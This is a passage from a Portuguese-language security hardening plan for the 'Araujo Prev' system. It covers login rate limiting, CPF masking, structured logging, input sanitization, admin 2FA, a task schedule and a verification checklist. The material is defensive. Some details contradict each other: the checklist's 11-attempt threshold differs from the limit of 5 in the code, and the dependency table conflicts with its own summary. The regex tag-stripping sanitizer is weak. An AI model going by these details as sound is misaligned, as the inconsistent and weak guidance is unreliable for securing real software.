    const { username } = req.body;
    if (!username) return next();
    const { rows } = await pgPool.query(
        `SELECT COUNT(*) as count FROM login_attempts
         WHERE username = $1 AND attempted_at > NOW() - INTERVAL '15 minutes'`,
        [username]
    );
    if (rows[0].count >= 5) {
        return res.status(429).json({ erro: "Muitas tentativas para este usuário. Aguarde 15 minutos." });
    }
    next();
}
```

### Ideia 5 — Mascarar CPF na interface por padrão

No frontend (`web/public/app/core.js` ou `web/public/app/recibos.js`), adicionar função que mascara CPF na visualização:

```js
function maskCPF(cpf) {
    if (!cpf) return "";
    return cpf.replace(/^(\d{3})\d{6}(\d{2})$/, "$1.***.***-$2");
}
```

Com botão "Revelar CPF" que pede confirmação (ou senha). Isso reduz o risco visual de "shoulder surfing" (alguém olhando a tela por cima).

### Ideia 6 — Logs centralizados no CloudWatch

O serviço `logger` atualmente escreve no console (stdout). Para ambientes AWS (Elastic Beanstalk), os logs do console são automaticamente capturados pelo CloudWatch, mas sem estruturação.

Melhoria possível: enviar logs como eventos JSON estruturados para CloudWatch Logs usando `@aws-sdk/client-cloudwatch-logs`:

```js
// services/logger.js
const { CloudWatchLogs } = require("@aws-sdk/client-cloudwatch-logs");
const cwl = new CloudWatchLogs({ region: process.env.AWS_REGION });

module.exports = {
    info: (msg) => log("INFO", msg),
    warn: (msg) => log("WARN", msg),
    error: (msg, err) => log("ERROR", msg, err),
};

async function log(level, message, error) {
    const entry = {
        level,
        message,
        timestamp: new Date().toISOString(),
        ...(error && { error: error.message, stack: error.stack }),
    };
    console.log(JSON.stringify(entry)); // stdout para Elastic Beanstalk capturar
    // Opcional: enviar para CloudWatch Logs
}
```

### Ideia 7 — Sanitização automática de entrada

Criar um middleware global em `server.js` que sanitiza **todas** as entradas de usuário:

```js
function sanitizeInput(req, res, next) {
    if (req.body) {
        for (let key in req.body) {
            if (typeof req.body[key] === "string") {
                req.body[key] = req.body[key].replace(/<[^>]*>/g, ""); // Remove HTML tags
            }
        }
    }
    next();
}
app.use(sanitizeInput);
```

**Atenção:** Pode quebrar campos que permitem HTML (raramente). Implementar com uma lista de exceções por rota.

### Ideia 8 — Autenticação de dois fatores (2FA)

Para usuários admin, adicionar segunda camada:
1. Na resposta do login, se o usuário é admin, retornar `{ "2fa_required": true }`
2. Enviar código de 6 dígitos por e-mail
3. Rota `POST /api/login/2fa` que valida o código e retorna o token final

O [`speakeasy`](https://www.npmjs.com/package/speakeasy) é a lib padrão para TOTP em Node.js:

```bash
npm install speakeasy qrcode
```

---

## CRONOGRAMA DE IMPLEMENTAÇÃO

### Tabela resumo

| # | Item | Esforço | Prioridade | Complexidade | Risco de mudança |
|---|------|---------|-----------|-------------|-----------------|
| 1 | Rate limiter no login | **2 min** | 🔴 Máxima | 🟢 Fácil | Baixíssimo (só adiciona middleware) |
| 2 | Logout invalida token (`token_version`) | **30 min** | 🔴 Máxima | 🟡 Médio | Médio — migration + 3 arquivos afetados |
| 3 | Remover `Authorization: Bearer` | **5 min** | 🟡 Média | 🟢 Fácil | Médio — verificar integrações externas |
| 4 | console.log → logger | **15 min** | 🟡 Média | 🟢 Fácil | Baixo |
| 5 | Webhook CPF mascarado | **15 min** | 🟡 Média | 🟢 Fácil | Baixo |
| 6 | Error handler seguro | **5 min** | 🟡 Média | 🟢 Fácil | Baixíssimo |
| 7 | Auditoria de login | **20 min** | 🟢 Baixa | 🟢 Fácil | Baixo |
| 8 | Soft delete clientes | **40 min** | 🟢 Baixa | 🟡 Médio | Médio — consistência com recibos |
| 9 | CSP sem `unsafe-inline` | **2h** | 🟢 Baixa | 🔴 Complexo | Médio — 283 alterações, requer teste visual |
| | **Total** | **~4h** | | | |

### Ordem recomendada de execução

```
   1  →  2  →  3  →  4  →  6  →  5  →  7  →  8  →  9
2min   30min   5min  15min   5min  15min  20min  40min   2h
├─────────────────────────────┤  ├───────────────────────┤
      ~57 min (90% do risco)           ~3h (resiliência)
```

**Justificativa:**

1. **Rate limiter (2 min):** Maior impacto com mínimo esforço. Impede força bruta.
2. **Logout com invalidação (30 min):) Token vazado morre no logout. Maior ganho de segurança.
3. **Remove Authorization Bearer (5 min):) Fecha porta auxiliar para XSS.
4. **console.log → logger (15 min):) Dados sensíveis param de vazar em logs.
5. **Webhook CPF mascarado (15 min):) Protege dados de clientes em integração externa.
6. **Error handler seguro (5 min):) Não vaza detalhes internos.
7. **Auditoria de login (20 min):) Rastreabilidade de acessos.
8. **Soft delete clientes (40 min):) Consistência com recibos.
9. **CSP sem unsafe-inline (2h):) Último por ser demorado e de menor risco.

### Dependências entre tarefas

| Item | Depende de | Bloqueia |
|------|-----------|----------|
| 1 — Rate limiter | Nada | Nada |
| 2 — token_version | Nada | Nada |
| 3 — Remover Bearer | 2 (token_version) | Nada |
| 4 — console.log → logger | Nada | Nada |
| 5 — Webhook | Nada | Nada |
| 6 — Error handler | Nada | Nada |
| 7 — Auditoria login | Nada | Nada |
| 8 — Soft delete clientes | Nada | Nada |
| 9 — CSP | Nada | Nada |

**Nenhuma tarefa bloqueia outra — podem ser feitas em paralelo.**

### Recomendação para execução

1. **Fazer agora (sessão atual):** Itens 1, 2, 3, 4 (total ~52 min)
2. **Próxima sessão (1h):** Itens 5, 6, 7, 8 (total ~1h20min)
3. **Sessão dedicada (2h):** Item 9 (CSP) — requer paciência e teste visual detalhado

---

## Apêndice A — Checklist de Verificação Pós-Implementação

Após cada correção, verificar:

- [ ] **Rate limiter:** Fazer 11 requests para login em 15 min → 11ª deve retornar 429
- [ ] **Token invalidação:** Fazer login → copiar cookie → logout → tentar usar cookie copiado → 401
- [ ] **Sem Bearer:** Fazer request com `Authorization: Bearer <token>` → 401 (a menos que Bearer seja mantido)
- [ ] **Logger:** Verificar arquivo de log ou stdout — mensagens com timestamp ISO e nível
- [ ] **Webhook:** Verificar payload enviado — CPF deve estar mascarado
- [ ] **Error handler:** Enviar arquivo inválido — erro não deve conter detalhes internos
- [ ] **Auditoria:** Fazer login → verificar tabela `auditoria` — deve ter entrada com IP, usuário, timestamp
- [ ] **Soft delete:** Excluir cliente → listar clientes → cliente não deve aparecer → chamar restaurar → cliente deve aparecer
- [ ] **CSP:** Abrir devtools → verificar se há warning sobre `style-src 'unsafe-inline'` (não deve ter)
- [ ] **Geral:** `npm test` (se existir) passa? Testes de integração continuam funcionando?

---

## Apêndice B — Referências

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Content Security Policy Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- LGPD — Lei Geral de Proteção de Dados: https://www.gov.br/cidadania/pt-br/acesso-a-informacao/lgpd
- express-rate-limit: https://www.npmjs.com/package/express-rate-limit
- JSON Web Token (RFC 7519): https://datatracker.ietf.org/doc/html/rfc7519

---

> **Fim do documento**
>
> *Este documento é parte do processo de auditoria de segurança do sistema Araujo Prev.*
> *Última atualização: 17/07/2026*
